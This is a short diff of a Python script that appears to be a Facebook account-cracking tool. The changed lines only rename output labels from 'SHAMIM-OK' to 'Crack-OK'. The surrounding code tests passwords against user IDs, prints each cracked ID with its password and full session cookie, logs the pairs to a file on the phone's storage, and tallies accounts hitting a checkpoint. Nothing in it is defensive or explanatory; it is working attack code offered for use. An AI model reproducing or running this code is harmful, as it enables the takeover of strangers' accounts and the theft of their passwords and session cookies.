@@ -271,15 +271,15 @@ def jubair(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;33m[\033[1;32mSHAMIM-OK 💋\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
+                print(f"\033[1;33m[\033[1;32mCrack-OK 💋\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                 print(f"\033[1;92m[] COOKIE💥 :\033[1;95m {coki}")
-                open('/sdcard/SHAMIM-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Crack-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-               # print(f"#\033[1;33m[\033[1;32mSHAMIM-CP\033[1;33m]\033[1;91m {uid}|{ps}")
+               # print(f"#\033[1;33m[\033[1;32mCrack-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                 #open('/sdcard/SHAMIM-CP.txt',# 'a').write( ui#d+' | '#+ps+' \#n')
                 cps.append(uid)
                 break
